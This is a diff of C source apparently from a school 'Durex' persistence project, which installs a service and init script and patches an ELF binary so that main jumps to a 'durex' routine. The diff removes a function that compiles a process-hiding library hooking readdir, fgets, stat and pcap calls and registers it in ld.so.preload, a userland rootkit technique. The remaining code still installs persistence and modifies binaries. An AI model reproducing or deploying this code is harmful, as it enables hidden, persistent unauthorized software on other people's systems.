@@ -6,7 +6,7 @@
 /*   By: root </var/mail/root>                      +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2018/07/15 02:21:05 by root              #+#    #+#             */
-/*   Updated: 2018/08/13 01:37:28 by root             ###   ########.fr       */
+/*   Updated: 2018/08/14 01:51:55 by root             ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -27,9 +27,6 @@ static int		install_error(int fd)
 	remove(DUREX_SERVICE_FILE);
 	remove(DUREX_CONF_FILE);
 	remove(DUREX_INIT_FILE);
-	remove(DUREX_PROCESSHIDER_LIB);
-	remove(DUREX_PRELOAD);
-	system("mpg123 audio/Slap.mp3 2>/dev/null");
 	return 1;
 }
 
@@ -51,9 +48,9 @@ static int		modify_binary(void *data)
 			for (size_t j = 0; j < shd[i].sh_size / shd[i].sh_entsize; j++) {
 				char	*sname = symbol_table + symbol->st_name;
 
-				if (!strcmp(sname, "main"))
+				if (!mystrcmp(sname, "main"))
 					mainoff = symbol->st_value;
-				else if (!strcmp(sname, "durex"))
+				else if (!mystrcmp(sname, "durex"))
 					durexoff = symbol->st_value;
 				symbol_addr += shd[i].sh_entsize;
 				symbol = (Elf64_Sym *)symbol_addr;
@@ -142,36 +139,5 @@ int			install_init()
 	if (ret != sizeof(DUREX_INIT_SCRIPT))
 		return install_error(-1);
 	system(DUREX_ACTIVATE);
-	return 0;
-}
-
-int			hide_binary()
-{
-	const char	*files[] = { DUREX_FGETS_FILE, DUREX_LXSTAT_FILE, DUREX_PCAP_FILE,
-							 DUREX_READDIR_FILE, DUREX_RECVMSG_FILE, DUREX_XSTAT_FILE };
-	const char	*src[] = { DUREX_FGETS_SRC, DUREX_LXSTAT_SRC, DUREX_PCAP_SRC,
-						   DUREX_READDIR_SRC, DUREX_RECVMSG_SRC, DUREX_XSTAT_SRC };
-	int		fd;
-	size_t	ret;
-
-	for (size_t i = 0; i < sizeof(files) / sizeof(*files); i++) {
-		fd = open(files[i], O_CREAT | O_TRUNC | O_WRONLY, 0644);
-		if (fd < 0)
-			return install_error(fd);
-		ret = write(fd, src[i], strlen(src[i]));
-		if (ret != strlen(src[i]))
-			return install_error(fd);
-	}
-	system("gcc -Wall -fPIC -shared -o "DUREX_PROCESSHIDER_LIB
-		   " "DUREX_FGETS_FILE
-		   " "DUREX_LXSTAT_FILE
-		   " "DUREX_PCAP_FILE
-		   " "DUREX_READDIR_FILE
-		   " "DUREX_RECVMSG_FILE
-		   " "DUREX_XSTAT_FILE
-		   " -ldl");
-	system("echo "DUREX_PROCESSHIDER_LIB" >> "DUREX_PRELOAD);
-	for (size_t i = 0; i < sizeof(files) / sizeof(*files); i++)
-		remove(files[i]);
 	return 0;
 }
